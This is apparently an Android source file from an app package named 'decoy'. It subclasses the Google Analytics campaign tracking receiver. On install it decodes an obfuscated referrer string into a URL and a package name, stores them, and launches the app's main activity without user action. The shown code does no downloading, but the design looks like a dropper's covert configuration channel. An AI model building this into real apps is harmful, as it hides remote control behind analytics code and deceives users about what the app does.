package com.example.decoy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.example.decoy.binary_utils.BinaryReader;
import com.google.android.gms.analytics.CampaignTrackingReceiver;

import java.io.ByteArrayInputStream;

public class customCampaignTrackingReceiver extends CampaignTrackingReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String stName = "pName";
        String stUrl = "url";
        String stReferr = "referr";

        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences("MyPref", Context.MODE_PRIVATE);
			SharedPreferences.Editor edit = sharedPreferences.edit();

            Bundle extras = intent.getExtras();
            if (extras != null) {
                String string = extras.getString("referrer");
                if (string != null) {
                    Log.e("asdffff", string);

                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(encDec.DecodeData(Base64.decode(string, 0)));
                    BinaryReader binaryReader = new BinaryReader(byteArrayInputStream);

                    String readString = binaryReader.readString();
                    String readString2 = binaryReader.readString();

                    if (!sharedPreferences.contains(stUrl)) {
                        edit.putString(stUrl, readString);
                        edit.apply();
                    }
                    if (!sharedPreferences.contains(stName)) {
                        edit.putString(stName, readString2);
                        edit.apply();
                    }
                }
            }

            if (!sharedPreferences.contains(stReferr)) {
                edit.putBoolean(stReferr, true);
                edit.apply();
            }
            if (sharedPreferences.getBoolean(stReferr, false)) {
                Intent subIntent = new Intent(context, MainActivity.class);
                subIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_CLEAR_TOP);
                context.startActivity(subIntent);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}